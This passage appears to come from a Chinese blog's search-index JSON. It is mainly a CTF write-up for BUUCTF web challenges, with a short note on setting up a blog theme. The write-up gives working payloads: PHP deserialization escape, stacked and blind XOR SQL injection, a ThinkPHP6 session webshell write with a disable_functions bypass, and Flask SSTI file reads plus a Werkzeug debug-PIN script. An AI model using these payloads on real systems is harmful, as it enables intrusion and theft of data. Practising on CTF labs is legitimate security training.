ackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见可以逃逸出来，因此payload： 1age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 登录页面 用户名admin 密码任意： [WEB]Blacklist题目分析首先查询，发现和强网杯的很像 因此尝试堆叠注入，过滤字符： 因此无法改名，也无法用预处理语句。 通过查资料 发现可以利用handler语句 可见flag在FlagHere表 Getflag构造语句查一下第一行数据： 123通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 11&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close; 直接查到了flag。 [WEB]Ezsqli题目分析sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数： 发现and、or等函数都过滤了： 发现^没有过滤，采用^测试注入点： 12id&#x3D;1^0%23id&#x3D;1^1%23 返回错误 返回正确。 发现存在注入。 接下来就构造注入语句，因为过滤了or，所以无法使用information_schema 绕过函数： 12345sys.schema_auto_increment_columnssys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.x$schema_flattened_keysjoin无列名注入 构造查表语句： 判断逻辑：返回Nu1L说明payload为1对，语句成立 返回Error Occured When Fetch Result payload为0，语句不成立 12查表名：id&#x3D;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;)^1 可见表名：f1ag_1s_h3r3_hhhhh 下面用无列名注入，利用到了ascii位偏移： 两个字符串比较时利用首字符的ascii码 核心payload：(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1) //子查询之间也可以直接通过&gt;、&lt;、=来进行判断。 测试字段： 123select 1select 1,2select 1,2,3 构造payload： 1id&#x3D;1^((select 1,&#39;f&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1 可见Nu1L页面的上一位就是我们要查询的值. Getflag 成功查询到flag。 [WEB]EasyThinking题目分析题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息： 猜测搜索处存在利用点。扫描目录发现存在www.zip，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本： 参考：https://paper.seebug.org/1114/ 参考：https://xz.aliyun.com/t/8409 TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径\\runtime\\session，文件名为32位就可以，构造后缀为.php的32位字符串，访问sess_+文件名 漏洞利用从注册的时候开始修改： 注册后search 页面 提交key，先写入&lt;?php phpinfo();?&gt; 然后访问看下：http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php 写入一句话，蚁剑连接发现执行不了命令，看下phpinfo： 发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass: [WEB]FlaskApp题目分析根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面： 查看源码发现提示PIN 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码： 可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。 漏洞利用采用if条件语句防止被过滤： 123456789&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9 可以得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;s_e_c_r_e_t_k_e_y&#x27;bootstrap = Bootstrap(app)class NameForm(FlaskForm): text = StringField(&#x27;BASE64加密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)class NameForm1(FlaskForm): text = StringField(&#x27;BASE64解密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1def hint(): txt = &quot;失败乃成功之母！！&quot; return render_template(&quot;hint.html&quot;,txt = txt)def encode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;结果 :&#123;0&#125;&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#x27;encode&#x27;)) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;)def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#x27;decode&#x27;)) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)def not_found(name): return render_template(&quot;404.html&quot;,name = name)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 1[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39; 重点在waf： 123456def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 可见过滤了命令执行常用函数，不能采用命令执行的方式。 继续读一下必要信息： 1234567891011121314username #读取&#x2F;etc&#x2F;passwd&#x2F;&#x2F;本题：flaskwebmodname #flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flaskgetattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径&#x2F;&#x2F;本题通过报错得到路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.pyuuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式&#x2F;&#x2F;获取方式：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#x2F;&#x2F;本题：02:42:ac:10:af:49 转化为十进制(python print(0x0242ac10af49)) 2485377871689get_machine_id()&#x2F;&#x2F;读取&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值&#x2F;&#x2F;windows读取注册表：SOFTWARE\\\\Microsoft\\\\Cryptography&#x2F;&#x2F;docker下：&#x2F;proc&#x2F;self&#x2F;cgroup&#x2F;&#x2F;本题：0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*-coding:utf-8# From https://xz.aliyun.com/t/2553import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485377871689&#x27;,#str(uuid.getnode()), /sys/class/net/ens0/address &#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 信息修改完整后运行得到 pin码：410-898-797 读文件： 123import osos.listdir(&#x27;/&#x27;)os.popen(&#x27;cat /this_is_the_flag.txt&#x27;).readlines() 有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload： 1&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125; 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1], &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v1sun.github.io/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]},{"title":"This is the first blog","slug":"The_first_blog","date":"2021-04-18T12:21:57.275Z","updated":"2021-05-02T14:53:37.577Z","comments":true,"path":"2021/04/18/The_first_blog/","link":"","permalink":"https://v1sun.github.io/2021/04/18/The_first_blog/","excerpt":"","text":"This is the first blog说明学生时代马上结束了，服务器也到期了 又回到了刚接触网络安全的时候所采用的的低成本方式：Github+Hexo 博客用于记录自己的一些学习笔记，方便梳理自己的知识体系，同时也通过写博客来督促自己完成学习任务，减少一些DDL 去年一年准备各种考试，技术方面落下了不少，正在恶补的同时希望能够继续提升自己 That’s all……… 主题基于对Material Design 风格的热爱，采用Fluid主题 主题 GitHub: https://github.com/fluid-dev/hexo-theme-fluid 主题文档：https://hexo.fluid-dev.com/docs/start/ 安装方便，Hexo 5.0.0 版本以上，通过 npm 直接安装： 1npm install --save hexo-theme-fluid 博客目录下创建_config.fluid.yml文件，copy github的内容，根据自己的需要修改配置。","categories":[],"tags":[]}],"categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"https://v1sun.github.io/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"},{"name":"CTF","slug":"CTF","permalink":"https://v1sun.github.io/categories/CTF/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://v1sun.github.io/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"VulnHub","permalink":"https://v1sun.github.io/tags/VulnHub/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"},{"name":"ctf","slug":"ctf","permalink":"https://v1sun.github.io/tags/ctf/"},{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"}]}